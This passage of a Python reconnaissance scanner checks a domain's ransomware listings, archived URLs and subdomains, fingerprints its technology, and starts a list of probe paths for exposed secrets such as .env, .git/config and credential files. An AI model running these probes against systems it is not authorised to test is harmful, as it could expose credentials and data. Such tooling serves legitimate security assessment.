        "public_url":    f"https://image.thum.io/get/width/1280/crop/800/noanimate/https://{domain}",
        "title":         None,
        "description":   None,
        "favicon_url":   f"https://www.google.com/s2/favicons?domain={domain}&sz=64",
        "logo_url":      f"https://logo.clearbit.com/{domain}",
        "ransomware":    [],
        "threat_feeds":  {},
        "cms":           None,
    }

    # ── Playwright local capture (best quality, optional) ──
    if shutil.which("playwright") or _has_playwright():
        try:
            pw = _screenshot_playwright(domain)
            if pw:
                result["method"] = "playwright"
                result["data"]   = pw.get("data")
                result["format"] = "base64_png"
        except Exception:
            pass

    # ── Fetch page title + meta description ──
    try:
        r = req(f"https://{domain}", timeout=10)
        if r and r.text:
            import re as _re
            t = _re.search(r"<title[^>]*>([^<]+)</title>", r.text, _re.I)
            if t:
                result["title"] = t.group(1).strip()[:120]
            d = _re.search(r'<meta[^>]+name=.description.[^>]+content=.([^"\'>]+).', r.text, _re.I)
            if not d:
                d = _re.search(r'<meta[^>]+content=.([^"\'>]+).[^>]+name=.description.', r.text, _re.I)
            if d:
                result["description"] = d.group(1).strip()[:250]
            # Detect CMS
            body = r.text.lower()
            if "wp-content" in body or "wp-includes" in body:
                result["cms"] = "WordPress"
            elif "joomla" in body:
                result["cms"] = "Joomla"
            elif "drupal" in body:
                result["cms"] = "Drupal"
            elif "shopify" in body:
                result["cms"] = "Shopify"
            elif "wix.com" in body:
                result["cms"] = "Wix"
    except Exception:
        pass

    # ── Ransomware.live v2 API — no auth, no key needed ──
    # Base URL: https://api.ransomware.live/v2
    # Correct endpoint: /searchvictims/<keyword>
    import os
    rw_api_key = os.environ.get("RANSOMWARE_LIVE_API_KEY", "").strip()
    rw_headers = {"User-Agent": "Kumo/1.0", "Accept": "application/json"}
    if rw_api_key:
        rw_headers["X-API-Key"] = rw_api_key

    def rw_get(url):
        try:
            r = requests.get(url, headers=rw_headers, timeout=12, verify=False, allow_redirects=True)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return No# Validate: only include victims that actually relate to our domain
    def _rw_match(v, dom):
        vn = (v.get("victim") or v.get("company") or "").lower()
        vw = (v.get("website") or v.get("url") or "").lower()
        dl = dom.lower()
        if dl in vw or dl in vn: return True
        base = dl.split(".")[0]
        if len(base) >= 5:
            import re as _re
            pat = r'(?<![a-z0-9])' + _re.escape(base) + r'(?![a-z0-9])'
            if _re.search(pat, vn) or _re.search(pat, vw): return True
        return False

    # Search full domain
    try:
        hits = rw_get(f"https://api.ransomware.live/v2/searchvictims/{domain}")
        if isinstance(hits, list):
            for v in hits[:10]:
                if _rw_match(v, domain):
                    result["ransomware"].append({
                        "group":       v.get("group", v.get("group_name", "")),
                        "date":        (v.get("attackdate") or v.get("discovered") or "")[:10],
                        "description": (v.get("description") or v.get("summary") or "")[:200],
                        "victim":      v.get("victim", ""),
                        "country":     v.get("country", ""),
                        "url":         v.get("website", v.get("url", "")),
                    })
    except Exception:
        pass

    # Search org name only if ≥5 chars (prevents short words from matching unrelated victims)
    try:
        base = domain.split(".")[0]
        if len(base) >= 5:
            hits2 = rw_get(f"https://api.ransomware.live/v2/searchvictims/{base}")
            if isinstance(hits2, list):
                existing = {r.get("victim","") for r in result["ransomware"]}
                for v in hits2[:10]:
                    if v.get("victim","") not in existing and _rw_match(v, domain):
                        result["ransomware"].append({
                            "group":       v.get("group", v.get("group_name", "")),
                            "date":        (v.get("attackdate") or v.get("discovered") or "")[:10],
                            "description": (v.get("description") or v.get("summary") or "")[:200],
                            "victim":      v.get("victim", ""),
                            "country":     v.get("country", ""),
                            "url":         v.get("website", v.get("url", "")),
                        })
    except Exception:
        pass

    if result["ransomware"]:
        result["ransomware_status"] = "found"
    else:
        result["ransomware_status"] = "clean"

    # ── URLhaus — malware URL database (no auth needed) ──
    try:
        r = requests.post(
            "https://urlhaus-api.abuse.ch/v1/host/",
            data={"host": domain},
            timeout=8,
            headers={"User-Agent": "Kumo/1.0"},
        )
        if r and r.status_code == 200:
            j = r.json()
            if j.get("query_status") != "no_results":
                result["threat_feeds"]["urlhaus"] = {
                    "status":     j.get("query_status", ""),
                    "urls_count": len(j.get("urls", [])),
                    "blacklists": j.get("blacklists", {}),
                }
    except Exception:
        pass

    return result


def _has_playwright():
    try:
        import playwright  # noqa
        return True
    except ImportError:
        return False


def _screenshot_playwright(domain):
    import base64
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-setuid-sandbox"])
        page = browser.new_page(viewport={"width": 1280, "height": 800})
        page.goto(f"https://{domain}", wait_until="domcontentloaded", timeout=15000)
        page.wait_for_timeout(2000)
        png_bytes = page.screenshot(full_page=False)
        browser.close()
        b64 = base64.b64encode(png_bytes).decode()
        return {
            "method": "playwright",
            "format": "base64_png",
            "data": b64,
            "url": f"https://{domain}",
            "size": len(png_bytes),
        }


# ═══════════════════════════════════════════════════════════════
# MODULE: WAYBACK
# ═══════════════════════════════════════════════════════════════

def scan_wayback(domain):
    results = {"snapshot": None, "urls": [], "interesting": []}

    r = req(f"https://archive.org/wayback/available?url={domain}", timeout=15)
    if r:
        try:
            snap = r.json().get("archived_snapshots", {}).get("closest", {})
            if snap:
                results["snapshot"] = {"timestamp": snap.get("timestamp", "")[:8], "url": snap.get("url", "")}
        except Exception:
            pass

    r = req(f"https://web.archive.org/cdx/search/cdx?url=*.{domain}&output=json&fl=timestamp,original,statuscode&collapse=urlkey&limit=150", timeout=20)
    if r:
        try:
            data = r.json()
            if len(data) > 1:
                rows = data[1:]
                urls = set(row[1] for row in rows)
                timestamps = sorted([row[0] for row in rows])
                results["urls"] = list(urls)[:100]
                results["range"] = f"{timestamps[0][:4]} - {timestamps[-1][:4]}" if timestamps else ""
                results["total"] = len(urls)

                interesting_kw = ["admin", "login", "api", "config", "backup", ".env", ".git",
                                  "wp-admin", "phpmyadmin", "debug", "test", "staging", ".sql",
                                  ".bak", "password", "secret", "token", ".log"]
                results["interesting"] = [u for u in urls if any(k in u.lower() for k in interesting_kw)][:20]
        except Exception:
            pass
    return results


# ═══════════════════════════════════════════════════════════════
# MODULE: SUBDOMAIN BRUTE FORCE
# ═══════════════════════════════════════════════════════════════

def scan_bruteforce(domain):
    wordlist = [
        "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", "ns3",
        "dns", "mx", "cloud", "git", "gitlab", "jenkins", "api", "dev", "staging",
        "stg", "test", "beta", "alpha", "demo", "app", "apps", "admin", "panel",
        "portal", "dashboard", "monitor", "grafana", "kibana", "vpn", "remote",
        "rdp", "ssh", "proxy", "cdn", "static", "assets", "img", "images", "media",
        "files", "docs", "wiki", "blog", "forum", "shop", "store", "pay", "billing",
        "support", "help", "status", "db", "database", "mysql", "postgres", "redis",
        "elastic", "mongo", "backup", "bk", "old", "legacy", "new", "v2", "m", "mobile",
        "sso", "auth", "login", "oauth", "id", "accounts", "ci", "cd", "deploy",
        "build", "registry", "docker", "k8s", "sentry", "jira", "confluence",
        "s3", "storage", "archive", "logs", "metrics", "api2", "gateway", "gw",
        "sandbox", "qa", "uat", "preprod", "crm", "erp", "upload", "download",
        "autodiscover", "exchange", "owa", "cpanel", "whm", "plesk", "webmin",
    ]

    # ── Wildcard DNS detection ──
    # If a random subdomain resolves, the domain uses wildcard DNS.
    # All results would be false positives — mark them accordingly.
    import random, string
    wildcard_ip = None
    try:
        rand_sub = "".join(random.choices(string.ascii_lowercase, k=12))
        wc = socket.getaddrinfo(f"{rand_sub}.{domain}", None, socket.AF_INET, socket.SOCK_STREAM)
        wildcard_ip = wc[0][4][0]
    except Exception:
        pass  # No wildcard — good

    def check(prefix):
        fqdn = f"{prefix}.{domain}"
        try:
            r = socket.getaddrinfo(fqdn, None, socket.AF_INET, socket.SOCK_STREAM)
            ip = r[0][4][0]
            # Skip if it resolves to the wildcard IP (false positive)
            if wildcard_ip and ip == wildcard_ip:
                return {"subdomain": fqdn, "ip": ip, "alive": False, "wildcard": True}
            # Verify it's a real host — do an HTTP probe, skip pure redirects
            try:
                probe = requests.get(
                    f"https://{fqdn}", timeout=4, allow_redirects=False,
                    headers={"User-Agent": "Kumo/1.0"}, verify=False
                )
                # Accept 200, 401, 403, 404, 500 — these are real responses
                # Reject 301/302 that redirect OUT of the domain (catches wildcard CDN redirects)
                if probe.status_code in (301, 302, 307, 308):
                    location = probe.headers.get("location", "")
                    if domain not in location:
                        return {"subdomain": fqdn, "ip": ip, "alive": False, "redirect": location}
            except Exception:
                pass  # Can't HTTP probe — DNS hit is enough evidence
            return {"subdomain": fqdn, "ip": ip, "alive": True}
        except Exception:
            return {"subdomain": fqdn, "ip": None, "alive": False}

    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        results = list(ex.map(check, wordlist))

    found = [r for r in results if r["alive"]]
    return {
        "found": found,
        "total_checked": len(wordlist),
        "wildcard_detected": wildcard_ip is not None,
        "wildcard_ip": wildcard_ip,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: SUBDOMAIN SCANNER (multi-source)
# ═══════════════════════════════════════════════════════════════

def scan_subdomains(domain):
    """
    Aggregate subdomains from 4 free passive sources (no API keys):
      1. crt.sh   — certificate transparency logs
      2. HackerTarget — hostsearch API
      3. RapidDNS — web scrape
      4. AlienVault OTX — passive DNS
    Then resolve all unique results in parallel.
    """
    subs = set()
    sources_used = []
    sources_failed = []

    # --- Source 1: crt.sh ---
    try:
        r = req(f"https://crt.sh/?q=%.{domain}&output=json", timeout=25)
        if r:
            for entry in r.json():
                for name in entry.get("name_value", "").split("\n"):
                    name = name.strip().lower().lstrip("*.")
                    if name and name.endswith(f".{domain}") and name != domain:
                        subs.add(name)
            sources_used.append("crt.sh")
        else:
            sources_failed.append("crt.sh")
    except Exception:
        sources_failed.append("crt.sh")

    # --- Source 2: HackerTarget hostsearch (free tier, no key) ---
    try:
        r = req(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=15)
        if r and r.text and "error" not in r.text.lower()[:30]:
            for line in r.text.strip().split("\n"):
                parts = line.split(",")
                if parts:
                    name = parts[0].strip().lower()
                    if name.endswith(f".{domain}") and name != domain:
                        subs.add(name)
            sources_used.append("hackertarget")
        else:
            sources_failed.append("hackertarget")
    except Exception:
        sources_failed.append("hackertarget")

    # --- Source 3: RapidDNS ---
    try:
        r = req(f"https://rapiddns.io/subdomain/{domain}?full=1", timeout=15,
                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"})
        if r:
            found = re.findall(r'<td>([a-zA-Z0-9\-\.]+\.' + re.escape(domain) + r')</td>', r.text)
            for name in found:
                name = name.strip().lower()
                if name.endswith(f".{domain}") and name != domain:
                    subs.add(name)
            sources_used.append("rapiddns")
        else:
            sources_failed.append("rapiddns")
    except Exception:
        sources_failed.append("rapiddns")

    # --- Source 4: AlienVault OTX passive DNS ---
    try:
        r = req(f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns", timeout=15)
        if r:
            data = r.json()
            for entry in data.get("passive_dns", []):
                hostname = entry.get("hostname", "").strip().lower()
                if hostname.endswith(f".{domain}") and hostname != domain:
                    subs.add(hostname)
            sources_used.append("alienvault")
        else:
            sources_failed.append("alienvault")
    except Exception:
        sources_failed.append("alienvault")

    subs = sorted(subs)

    # --- Resolve all found subdomains in parallel ---
    sensitive_prefixes = {
        "admin", "api", "dev", "staging", "stg", "test", "vpn", "mail", "ftp",
        "db", "database", "jenkins", "gitlab", "jira", "internal", "intranet",
        "portal", "grafana", "kibana", "elastic", "mongo", "redis", "backup",
        "old", "legacy", "beta", "uat", "phpmyadmin", "cpanel", "webmail",
        "sso", "auth", "login", "docker", "k8s", "confluence", "vault",
        "secrets", "prod", "production", "mgmt", "management", "remote", "rdp",
        "ssh", "git", "ci", "cd", "build", "registry", "sentry",
    }

    def resolve_sub(sub):
        try:
            r2 = socket.getaddrinfo(sub, None, socket.AF_INET, socket.SOCK_STREAM)
            ip = r2[0][4][0]
            prefix = sub.replace(f".{domain}", "").split(".")[-1]
            is_sensitive = prefix in sensitive_prefixes
            return {"subdomain": sub, "ip": ip, "alive": True, "sensitive": is_sensitive}
        except Exception:
            return {"subdomain": sub, "ip": "-", "alive": False, "sensitive": False}

    resolved = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        resolved = list(ex.map(resolve_sub, subs[:200]))

    alive = [r for r in resolved if r["alive"]]
    sensitive = [r for r in alive if r["sensitive"]]

    # --- Also pull Certificate Transparency logs (crt.sh) ---
    # Merged here so we have one unified subdomain card
    ct_total = 0
    ct_sensitive = []
    try:
        ct_data = scan_crtsh(domain)
        ct_total = ct_data.get("total", 0)
        # Add any CT-only subs not already in our list
        ct_subs = set(ct_data.get("subdomains", []))
        existing = set(subs)
        ct_only = ct_subs - existing
        if ct_only:
            def resolve_ct(sub):
                try:
                    r2 = socket.getaddrinfo(sub, None, socket.AF_INET, socket.SOCK_STREAM)
                    ip = r2[0][4][0]
                    prefix = sub.replace(f".{domain}", "").split(".")[-1]
                    return {"subdomain": sub, "ip": ip, "alive": True, "sensitive": prefix in sensitive_prefixes}
                except Exception:
                    return {"subdomain": sub, "ip": "-", "alive": False, "sensitive": False}
            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
                ct_resolved = list(ex.map(resolve_ct, list(ct_only)[:100]))
            resolved.extend(ct_resolved)
            alive = [r for r in resolved if r["alive"]]
            sensitive = [r for r in alive if r["sensitive"]]
            subs = list(existing | ct_subs)
        ct_sensitive = [s["subdomain"] for s in ct_data.get("sensitive", [])]
    except Exception:
        pass

    return {
        "total":         len(subs),
        "alive_count":   len(alive),
        "subdomains":    subs,
        "resolved":      resolved,
        "sensitive":     sensitive,
        "sources_used":  sources_used,
        "sources_failed": sources_failed,
        "ct_total":      ct_total,
        "ct_sensitive":  ct_sensitive,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: WHATWEB (tool + Python fallback)
# ═══════════════════════════════════════════════════════════════

def scan_whatweb(domain):
    """
    Run WhatWeb binary if installed, else fall back to a deep
    pure-Python fingerprinter with 80+ signatures.
    """
    import subprocess
    import shutil

    whatweb_bin = shutil.which("whatweb")
    if whatweb_bin:
        try:
            result = subprocess.run(
                [whatweb_bin, "--color=never", "--no-errors", "-a", "3",
                 f"https://{domain}"],
                capture_output=True, text=True, timeout=30
            )
            output = result.stdout.strip() or result.stderr.strip()
            # Also parse into structured data
            detected = _parse_whatweb_output(output)
            return {
                "source": "whatweb_binary",
                "raw": output[:3000],
                "detected": detected,
            }
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass

    # --- Pure Python fallback ---
    return _whatweb_python(domain)


def _parse_whatweb_output(output):
    """Extract plugin names from whatweb raw output into a list."""
    detected = []
    # WhatWeb output: URL [status] Plugin[version], Plugin2, ...
    match = re.search(r'\[[\d]+\]\s*(.*)', output)
    if match:
        plugins_raw = match.group(1)
        for plugin in re.findall(r'([A-Za-z0-9_\-\.]+)(?:\[([^\]]*)\])?', plugins_raw):
            name, version = plugin
            if name and len(name) > 2:
                entry = name
                if version:
                    entry += f" [{version}]"
                detected.append(entry)
    return detected


def _whatweb_python(domain):
    """Deep Python-based tech fingerprinter — 80+ signatures."""
    if not HAS_REQUESTS:
        return {"error": "requests required", "source": "python_fallback"}

    resp = None
    final_url = ""
    for scheme in ["https", "http"]:
        try:
            resp = requests.get(
                f"{scheme}://{domain}", timeout=12, allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                                       "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
            )
            final_url = resp.url
            break
        except Exception:
            continue
    if not resp:
        return {"error": "cannot connect", "source": "python_fallback"}

    body = resp.text[:100000]
    hdrs = dict(resp.headers)
    hdrs_lower = {k.lower(): v for k, v in hdrs.items()}
    cookies = {c.name: c.value for c in resp.cookies}
    combined = body + str(hdrs)

    detected = {}

    SIGNATURES = {
        "CMS": {
            "WordPress":          [r'wp-content/', r'wp-includes/', r'wp-json'],
            "WordPress (login)":  [r'wp-login\.php'],
            "Drupal":             [r'sites/default/files', r'Drupal\.settings', r'/misc/drupal\.js'],
            "Joomla":             [r'/media/jui/', r'Joomla!', r'/components/com_'],
            "Shopify":            [r'cdn\.shopify\.com', r'Shopify\.theme'],
            "Wix":                [r'static\.wixstatic\.com', r'X-Wix-'],
            "Squarespace":        [r'squarespace\.com', r'static\.squarespace\.com'],
            "Webflow":            [r'webflow\.com', r'Webflow'],
            "Magento":            [r'Mage\.Cookies', r'/skin/frontend/', r'var BLANK_URL'],
            "PrestaShop":         [r'prestashop', r'/modules/blockcart/'],
            "OpenCart":           [r'catalog/view/theme', r'route=common/home'],
            "Ghost":              [r'ghost/api', r'content="Ghost '],
            "Typo3":              [r'typo3temp/', r'typo3conf/'],
            "MODX":               [r'modx-Revolution', r'MODx\.'],
            "October CMS":        [r'october/', r'cms::'],
        },
        "E-Commerce": {
            "WooCommerce":        [r'woocommerce', r'wc-api'],
            "BigCommerce":        [r'bigcommerce\.com', r'cdn\.bcapp\.dev'],
            "Ecwid":              [r'ecwid\.com', r'Ecwid\.init'],
            "Stripe":             [r'js\.stripe\.com', r'stripe\.com/v1'],
            "PayPal":             [r'paypal\.com/sdk', r'paypalobjects\.com'],
        },
        "Frontend Framework": {
            "React":              [r'react\.production\.min', r'__REACT_DEVTOOLS', r'_reactFiber'],
            "Vue.js":             [r'vue\.min\.js', r'Vue\.component\(', r'__vue__'],
            "Angular":            [r'ng-version=', r'angular\.min\.js', r'ng-app='],
            "Next.js":            [r'__NEXT_DATA__', r'/_next/static/'],
            "Nuxt.js":            [r'__NUXT__', r'_nuxt/'],
            "Svelte":             [r'__svelte', r'svelte-'],
            "Ember.js":           [r'ember\.min\.js', r'Ember\.Application'],
            "Backbone.js":        [r'backbone\.js', r'Backbone\.Model'],
            "jQuery":             [r'jquery[\.\-][\d]', r'jquery\.min\.js'],
            "Bootstrap":          [r'bootstrap\.min\.css', r'bootstrap\.min\.js', r'class="container"'],
            "Tailwind CSS":       [r'tailwindcss', r'class="[^"]*(?:flex|grid|px-|py-|text-)[^"]*"'],
            "Material UI":        [r'material-ui', r'MuiButton', r'@mui/'],
            "HTMX":               [r'htmx\.org', r'hx-get='],
        },
        "JavaScript Libraries": {
            "Lodash":             [r'lodash\.min\.js', r'_\.VERSION'],
            "Moment.js":          [r'moment\.min\.js', r'moment\.utc'],
            "Axios":              [r'axios\.min\.js'],
            "D3.js":              [r'd3\.min\.js', r'd3-selection'],
            "Chart.js":           [r'chart\.min\.js', r'Chart\.register'],
            "Three.js":           [r'three\.min\.js', r'THREE\.WebGLRenderer'],
            "Socket.io":          [r'socket\.io\.js', r'socket\.io/socket\.io'],
            "Alpine.js":          [r'alpinejs', r'x-data='],
        },
        "Server / Language": {
            "PHP":                [r'\.php["\s?/]', r'PHPSESSID'],
            "ASP.NET":            [r'__VIEWSTATE', r'__EVENTVALIDATION', r'aspnet'],
            "ASP.NET MVC":        [r'__RequestVerificationToken', r'mvc'],
            "Java / JSP":         [r'\.jsp["\s?/]', r'JSESSIONID'],
            "Ruby on Rails":      [r'_session_id', r'X-Runtime.*Ruby'],
            "Django":             [r'csrfmiddlewaretoken', r'django'],
            "Flask":              [r'Werkzeug/', r'flask'],
            "Laravel":            [r'laravel_session', r'Laravel'],
            "Express.js":         [r'X-Powered-By.*Express'],
            "Node.js":            [r'X-Powered-By.*Node'],
            "Python":             [r'X-Powered-By.*Python', r'gunicorn'],
        },
        "CDN / Hosting": {
            "Cloudflare":         [r'cf-ray', r'cloudflare', r'__cfduid'],
            "AWS CloudFront":     [r'cloudfront\.net', r'X-Amz-Cf-Id'],
            "AWS S3":             [r's3\.amazonaws\.com', r'AmazonS3'],
            "Fastly":             [r'Fastly-', r'fastly\.net'],
            "Akamai":             [r'akamaiedge\.net', r'akamai'],
            "Vercel":             [r'vercel\.app', r'x-vercel-'],
            "Netlify":            [r'netlify\.app', r'netlify\.com'],
            "GitHub Pages":       [r'github\.io'],
            "Heroku":             [r'heroku\.com', r'herokuapp\.com'],
            "DigitalOcean":       [r'digitaloceanspaces\.com'],
            "Azure":              [r'azurewebsites\.net', r'azure\.com'],
            "Google Cloud":       [r'storage\.googleapis\.com', r'appspot\.com'],
        },
        "Analytics / Marketing": {
            "Google Analytics":   [r'google-analytics\.com/analytics', r'gtag\('],
            "Google Tag Manager": [r'googletagmanager\.com'],
            "Facebook Pixel":     [r'connect\.facebook\.net', r'fbq\('],
            "Hotjar":             [r'hotjar\.com', r'hjid'],
            "Mixpanel":           [r'mixpanel\.com', r'mixpanel\.track'],
            "Segment":            [r'segment\.com', r'analytics\.js'],
            "Intercom":           [r'intercom\.io', r'Intercom\('],
            "HubSpot":            [r'hubspot\.com', r'hs-scripts'],
            "Drift":              [r'drift\.com', r'driftt\.com'],
            "Zendesk":            [r'zdassets\.com', r'zendesk\.com/embeddable'],
            "Crisp":              [r'crisp\.chat'],
            "Tawk.to":            [r'tawk\.to'],
        },
        "Security": {
            "Cloudflare WAF":     [r'cf-ray'],
            "reCAPTCHA":          [r'recaptcha\.net', r'g-recaptcha'],
            "hCaptcha":           [r'hcaptcha\.com'],
            "Sucuri WAF":         [r'Sucuri', r'sucuri\.net'],
            "Imperva / Incapsula": [r'incapsula', r'Imperva'],
            "Wordfence":          [r'wordfence'],
            "ModSecurity":        [r'Mod_Security', r'NOYB'],
        },
        "Authentication": {
            "Auth0":              [r'auth0\.com', r'cdn\.auth0\.com'],
            "Okta":               [r'okta\.com', r'oktacdn\.com'],
            "Keycloak":           [r'keycloak', r'/auth/realms/'],
            "Firebase Auth":      [r'firebase\.googleapis\.com', r'firebaseapp\.com'],
            "AWS Cognito":        [r'cognito-idp', r'amazoncognito\.com'],
            "OneLogin":           [r'onelogin\.com'],
        },
        "Monitoring / APM": {
            "Sentry":             [r'sentry\.io', r'sentry_key'],
            "Datadog":            [r'datadoghq\.com', r'ddtrace'],
            "New Relic":          [r'newrelic\.com', r'nr-data\.net'],
            "Dynatrace":          [r'dynatrace\.com', r'ruxitagentjs'],
            "Elastic APM":        [r'elastic\.co/guide/en/apm'],
        },
        "API / Backend": {
            "GraphQL":            [r'graphql', r'__schema', r'graphiql'],
            "REST API":           [r'/api/v[0-9]', r'application/json'],
            "gRPC-Web":           [r'grpc-web'],
            "WebSocket":          [r'ws://', r'wss://', r'WebSocket'],
            "Swagger / OpenAPI":  [r'swagger-ui', r'openapi\.json', r'api-docs'],
        },
    }

    version_patterns = {
        "WordPress":   r'wp-includes/js/wp-embed\.min\.js\?ver=([\d\.]+)',
        "jQuery":      r'jquery[\.\-]([\d\.]+)(?:\.min)?\.js',
        "Bootstrap":   r'bootstrap[\.\-]([\d\.]+)(?:\.min)?\.(?:css|js)',
        "PHP":         r'X-Powered-By.*PHP/([\d\.]+)',
        "React":       r'"version":"([\d\.]+)".*react',
        "Next.js":     r'"version":"([\d\.]+)".*next',
    }

    for cat, techs in SIGNATURES.items():
        found = []
        for name, patterns in techs.items():
            for p in patterns:
                if re.search(p, combined, re.IGNORECASE):
                    entry = name
                    # Try to extract version
                    if name in version_patterns:
                        vm = re.search(version_patterns[name], combined, re.IGNORECASE)
                        if vm:
                            entry = f"{name} {vm.group(1)}"
                    found.append(entry)
                    break
        if found:
            detected[cat] = found

    # Pull server/runtime from headers
    srv = hdrs_lower.get("server", "")
    if srv:
        detected.setdefault("Server", []).append(srv)
    pb = hdrs_lower.get("x-powered-by", "")
    if pb:
        detected.setdefault("Runtime", []).append(pb)
    gen = hdrs_lower.get("x-generator", "")
    if gen:
        detected.setdefault("Generator", []).append(gen)

    # Cookie-based hints
    cookie_hints = {
        "PHPSESSID": "PHP Session",
        "JSESSIONID": "Java/Tomcat",
        "ASP.NET_SessionId": "ASP.NET",
        "_rails_session": "Ruby on Rails",
        "laravel_session": "Laravel",
        "django_session": "Django",
        "wordpress_": "WordPress",
        "wp-settings": "WordPress",
    }
    cookie_detected = []
    for ck, hint in cookie_hints.items():
        if any(ck.lower() in c.lower() for c in cookies):
            cookie_detected.append(hint)
    if cookie_detected:
        detected.setdefault("Cookies (hints)", cookie_detected)

    total = sum(len(v) for v in detected.values())
    return {
        "source": "python_fallback",
        "url": final_url,
        "status_code": resp.status_code,
        "total_detected": total,
        "detected": detected,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: NUCLEI (tool-based)
# ═══════════════════════════════════════════════════════════════

def scan_nuclei(domain):
    """
    Vulnerability Scanner — 130+ built-in template checks.
    No external tools required. Pure HTTP-based detection.
    Covers: exposures, misconfigs, CVEs, CMS, cloud, CI/CD, APIs.
    """
    result = _nuclei_manual_checks(domain)
    # nuclei_installed kept for schema compat — always False (no tool needed)
    result["nuclei_installed"] = False
    return result


def _nuclei_manual_checks(domain):
    """
    Lightweight manual exposure checks run when nuclei is not installed.
    Checks 100+ paths inspired by top Nuclei templates:
    exposures, misconfigs, WordPress, admin panels, CVE-based paths, etc.
    """
    if not HAS_REQUESTS:
        return {"error": "requests required", "findings": []}

    EXPOSURE_PATHS = [
        # ── Environment & Secrets (nuclei: exposures/files) ──
        ("/.env",                         "Environment File Exposed",             "critical"),
        ("/.env.local",                   ".env.local Exposed",                   "critical"),
        ("/.env.production",              ".env.production Exposed",              "critical"),
        ("/.env.backup",                  ".env Backup Exposed",                  "critical"),
        ("/.env.dev",                     ".env.dev Exposed",                     "critical"),
        ("/.env.staging",                 ".env.staging Exposed",                 "critical"),
        ("/.env.example",                 ".env.example Exposed",                 "medium"),
        ("/config.env",                   "config.env Exposed",                   "critical"),
        ("/.npmrc",                       ".npmrc (npm credentials) Exposed",     "high"),
        ("/.pyc",                         "Python compiled file Exposed",         "medium"),
        ("/config.yaml",                  "config.yaml Exposed",                  "high"),
        ("/config.yml",                   "config.yml Exposed",                   "high"),
        ("/application.properties",       "Spring Properties Exposed",            "high"),
        ("/application.yml",              "Spring YAML Config Exposed",           "high"),
        ("/settings.py",                  "Django Settings Exposed",              "high"),
        ("/local_settings.py",            "Django Local Settings Exposed",        "critical"),
        ("/secrets.yaml",                 "Secrets YAML Exposed",                 "critical"),
        ("/credentials.json",             "Credentials JSON Exposed",             "critical"),
        ("/service-account.json",         "GCP Service Account Key Exposed",      "critical"),
        ("/firebase.json",                "Firebase Config Exposed",              "high"),
        ("/.firebase",                    ".firebase Config Exposed",             "high"),
        # ── Git / Source Control (nuclei: exposures/git) ──
        ("/.git/config",                  ".git Config Exposed",                  "critical"),
        ("/.git/HEAD",                    ".git HEAD Exposed",                    "critical"),
        ("/.git/COMMIT_EDITMSG",          ".git Commit Message Exposed",          "high"),
        ("/.git/index",                   ".git Index Exposed",                   "high"),
        ("/.git/logs/HEAD",               ".git Log Exposed",                     "high"),
        ("/.gitignore",                   ".gitignore Exposed",                   "low"),
        ("/.svn/entries",                 "SVN Entries Exposed",                  "high"),
        ("/.svn/wc.db",                   "SVN Database Exposed",                 "high"),
        ("/.hg/hgrc",                     "Mercurial Config Exposed",             "high"),
        # ── Database Backups (nuclei: exposures/backups) ──
        ("/backup.sql",                   "SQL Backup Exposed",                   "critical"),
        ("/dump.sql",                     "SQL Dump Exposed",                     "critical"),
        ("/database.sql",                 "Database SQL Exposed",                 "critical"),
        ("/db.sql",                       "DB SQL Backup Exposed",                "critical"),
        ("/backup.zip",                   "Backup ZIP Exposed",                   "critical"),
        ("/backup.tar.gz",                "Backup TAR Exposed",                   "critical"),
        ("/site.tar.gz",                  "Site Archive Exposed",                 "critical"),
        ("/www.tar.gz",                   "www Archive Exposed",                  "critical"),
        ("/db.sqlite",                    "SQLite Database Exposed",              "critical"),
        ("/db.sqlite3",                   "SQLite3 Database Exposed",             "critical"),
        ("/data.db",                      "Data Database Exposed",                "critical"),
        # ── WordPress (nuclei: http/cms/wordpress) ──
        ("/wp-admin/",                    "WordPress Admin Panel",                "medium"),
        ("/wp-login.php",                 "WordPress Login Page",                 "low"),
        ("/wp-config.php.bak",            "WP Config Backup Exposed",             "critical"),
        ("/wp-config.php~",               "WP Config Backup (~) Exposed",         "critical"),
        ("/wp-config.php.orig",           "WP Config Orig Exposed",               "critical"),
        ("/wp-content/debug.log",         "WordPress Debug Log Exposed",          "high"),
        ("/wp-content/uploads/",          "WordPress Uploads Accessible",         "medium"),
        ("/wp-json/wp/v2/users",          "WordPress Users API (REST)",           "medium"),
        ("/wp-json/wp/v2/posts",          "WordPress Posts API (REST)",           "info"),
        ("/xmlrpc.php",                   "WordPress XMLRPC Enabled",             "medium"),
        ("/wp-cron.php",                  "WordPress Cron Exposed",               "low"),
        ("/readme.html",                  "WordPress Readme (version leak)",      "info"),
        ("/license.txt",                  "WordPress License (version leak)",     "info"),
        ("/wp-includes/version.php",      "WordPress Version File Exposed",       "medium"),
        # ── Admin & Control Panels ──
        ("/admin/",                       "Admin Panel",                          "medium"),
        ("/administrator/",               "Administrator Panel",                  "medium"),
        ("/admin/login",                  "Admin Login Page",                     "medium"),
        ("/phpmyadmin/",                  "phpMyAdmin Exposed",                   "critical"),
        ("/pma/",                         "phpMyAdmin (pma) Exposed",             "critical"),
        ("/phpmyadmin/index.php",         "phpMyAdmin Index",                     "critical"),
        ("/adminer.php",                  "Adminer DB Tool Exposed",              "critical"),
        ("/adminer/",                     "Adminer Directory Exposed",            "critical"),
        ("/manager/html",                 "Tomcat Manager Exposed",               "critical"),
        ("/manager/status",               "Tomcat Status Exposed",                "high"),
        ("/jenkins/",                     "Jenkins CI Exposed",                   "high"),
        ("/jenkins/login",                "Jenkins Login",                        "high"),
        ("/grafana/login",                "Grafana Login",                        "high"),
        ("/kibana/",                      "Kibana Dashboard Exposed",             "high"),
        ("/solr/",                        "Apache Solr Admin Exposed",            "high"),
